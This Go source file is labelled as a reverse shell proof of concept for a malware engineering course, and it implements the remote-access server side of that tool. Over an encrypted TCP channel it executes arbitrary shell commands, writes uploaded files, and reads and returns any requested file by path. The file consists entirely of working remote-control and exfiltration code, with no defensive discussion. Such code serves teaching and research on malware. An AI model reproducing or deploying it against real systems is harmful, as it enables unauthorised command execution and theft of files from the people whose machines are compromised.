package main

// REVERSE SHELL POC FOR MALWARE ENGINEERING COURSE OF UIT

import (
	"log/slog"
	"strings"
	"path/filepath"
	"os"
	"fmt"
	"flag"
	"bytes"
	"net"
	"os/exec"

	"grevshell/grevcore"
)

var (
	C2Port		string
	C2Password	string	
)
func main() {
	flag.StringVar(&C2Port, "p", "9999", "Specify the listening port.")
	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")

	flag.Parse()

	stream, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", C2Port))

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info("Reverse shell listening on port 9999.")

	for {
		conn, err := stream.Accept()
		if err != nil {
			slog.Error("An error occured while establishing a connection with the client.", slog.Any("ERROR", err))
			continue
		}

		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())

		key, err := grevcore.DeriveKey(conn, []byte(C2Password))

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			conn.Close()
			continue
		}

		ExecuteRequest(conn, key)
	}
}

func ExecuteRequest(c net.Conn, key []byte) {
	defer c.Close()

	for {
		var buf bytes.Buffer
		var resp grevcore.Packet

		recv, err := grevcore.ReceivePacket(c, key)

		if err != nil {
			slog.Error("An error occured while receiving the request.", slog.Any("ERROR", err))
			return
		}

		switch recv.Header {
		case grevcore.ShellExecHeader:
			cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(string(recv.Data)))

			cmd.Stdout = &buf
			cmd.Stderr = &buf

			err := cmd.Run()

			if err != nil {
				slog.Error("An error occured while executing the command.", slog.Any("ERROR", err))
			}

			resp.Data = buf.Bytes()

		case grevcore.FileReceiveHeader:
			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
				return
			}

		case grevcore.FileSendHeader:
			resp.Header = grevcore.FileReceiveHeader
			resp.FileName = recv.FileName

			slog.Info("Sending file.", "FILE", recv.FileName)
			data, err := os.ReadFile(recv.FileName)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
				return
			}

			resp.Data = data

		default:
			resp.Data = []byte("?")
		}

		grevcore.SendPacket(c, resp, key)
	}
}
